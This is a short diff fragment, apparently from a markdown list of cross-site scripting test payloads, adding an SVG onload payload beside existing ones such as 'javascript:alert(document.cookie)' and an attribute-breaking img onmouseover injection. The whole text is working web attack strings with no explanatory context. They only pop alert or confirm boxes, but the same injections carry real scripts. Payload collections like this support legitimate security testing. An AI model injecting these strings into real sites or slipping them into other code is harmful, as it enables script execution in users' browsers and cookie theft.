@@ -64,6 +64,9 @@ javascript:alert(document.cookie)
 <h1>Testing TG</h1>
 
 flkdflkjslkf"><img%20src=x%20onmouseover=confirm(1)>
+
+<svg onload="javascript:window.onerror=confirm;throw 10">
+    
 ```
 
 #alert in window 
